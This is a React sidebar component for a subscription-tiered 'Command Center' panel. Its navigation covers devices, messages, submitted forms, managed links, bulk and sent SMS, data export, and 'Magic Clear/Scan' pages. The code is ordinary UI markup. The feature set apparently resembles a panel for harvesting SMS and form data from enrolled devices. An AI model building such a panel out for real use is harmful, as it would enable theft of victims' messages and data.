import { useLocation, useNavigate } from "react-router-dom";
import { usePanelName } from "@/hooks/useCustomization";
import { usePanelConfig } from "@/hooks/usePanelConfig";
import {
  LayoutDashboard, TabletSmartphone, MessagesSquare, SlidersHorizontal,
  Link2, Send, Palette, History, Info, Sparkles, ScanSearch, Download,
  BookOpen, FileText, Shield, Crown, Clock, User,
} from "lucide-react";

const mainNav = [
  { label: "Dashboard", icon: LayoutDashboard, path: "/" },
  { label: "Devices", icon: TabletSmartphone, path: "/devices" },
  { label: "Messages", icon: MessagesSquare, path: "/messages" },
  { label: "Settings", icon: SlidersHorizontal, path: "/settings" },
];

const toolsNav = [
  { label: "All Forms", icon: FileText, path: "/all-forms" },
  { label: "Manage Links", icon: Link2, path: "/manage-links" },
  { label: "All Sent SMS", icon: Send, path: "/all-sent-sms" },
  { label: "Bulk SMS", icon: Send, path: "/bulk-sms" },
  { label: "Export Data", icon: Download, path: "/export-data" },
];

const advancedNav = [
  { label: "Magic Clear", icon: Sparkles, path: "/magic-clear" },
  { label: "Magic Scan", icon: ScanSearch, path: "/magic-scan" },
];

const otherNav = [
  { label: "Customize", icon: Palette, path: "/customize" },
  { label: "Login History", icon: History, path: "/login-history" },
  
  { label: "About", icon: Info, path: "/about" },
];

const DesktopSidebar = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const panelName = usePanelName();
  const { config, daysRemaining } = usePanelConfig();
  const firstLetter = config.admin_name?.charAt(0)?.toUpperCase() || "?";

  const NavItem = ({ icon: Icon, label, path }: { icon: React.ElementType; label: string; path: string }) => {
    const isActive = location.pathname === path;
    return (
      <button
        onClick={() => navigate(path)}
        className={`w-full flex items-center gap-3 px-3 py-2 rounded-xl text-[13px] font-medium transition-all ${
          isActive
            ? "bg-primary/15 text-primary border border-primary/20"
            : "text-muted-foreground hover:text-foreground hover:bg-secondary/80"
        }`}
      >
        <Icon className={`h-4 w-4 shrink-0 ${isActive ? "text-primary" : ""}`} />
        <span className="truncate">{label}</span>
      </button>
    );
  };

  const SectionLabel = ({ label }: { label: string }) => (
    <p className="text-[9px] font-bold text-muted-foreground/60 uppercase tracking-[0.2em] px-3 pt-4 pb-1">{label}</p>
  );

  const tierInfo = (() => {
    if (!daysRemaining || daysRemaining <= 0) return { label: "Expired", color: "text-destructive" };
    if (daysRemaining > 10000) return { label: "VIP3", color: "text-yellow" };
    if (daysRemaining > 25) return { label: "Gold", color: "text-yellow" };
    if (daysRemaining >= 7) return { label: "Silver", color: "text-gray-400" };
    return { label: "Bronze", color: "text-amber-700" };
  })();

  return (
    <aside className="hidden lg:flex flex-col w-[240px] xl:w-[260px] h-screen sticky top-0 border-r border-border/50 bg-card/50 backdrop-blur-xl shrink-0">
      {/* Brand */}
      <div className="p-5 pb-4 border-b border-border/40">
        <div className="flex items-center gap-2.5">
          <div className="h-9 w-9 rounded-xl bg-primary/15 border border-primary/20 flex items-center justify-center">
            <Shield className="h-4 w-4 text-primary" />
          </div>
          <div className="min-w-0">
            <h1 className="text-sm font-black text-foreground tracking-tight truncate">{panelName}</h1>
            <p className="text-[8px] font-semibold text-muted-foreground uppercase tracking-[0.15em]">Command Center</p>
          </div>
        </div>
      </div>

      {/* Scrollable nav */}
      <nav className="flex-1 overflow-y-auto px-3 py-2 space-y-0.5">
        <SectionLabel label="Main" />
        {mainNav.map((item) => <NavItem key={item.path} {...item} />)}

        <SectionLabel label="Tools" />
        {toolsNav.map((item) => <NavItem key={item.path} {...item} />)}

        <SectionLabel label="Advanced" />
        {advancedNav.map((item) => <NavItem key={item.path} {...item} />)}

        <SectionLabel label="Other" />
        {otherNav.map((item) => <NavItem key={item.path} {...item} />)}
      </nav>

      {/* Profile at bottom */}
      <button
        onClick={() => navigate("/profile")}
        className="p-4 border-t border-border/40 flex items-center gap-3 hover:bg-primary/5 transition-colors"
      >
        <div className="h-9 w-9 rounded-xl bg-primary flex items-center justify-center text-primary-foreground text-sm font-black shrink-0">
          {firstLetter}
        </div>
        <div className="flex-1 min-w-0 text-left">
          <p className="text-xs font-bold text-foreground truncate">{config.admin_name}</p>
          <span className={`text-[10px] font-bold ${tierInfo.color} flex items-center gap-1`}>
            <Crown className="h-3 w-3" />
            {tierInfo.label}
            {daysRemaining && daysRemaining > 0 && daysRemaining <= 10000 ? ` · ${daysRemaining}d` : ""}
          </span>
        </div>
      </button>
    </aside>
  );
};

export default DesktopSidebar;
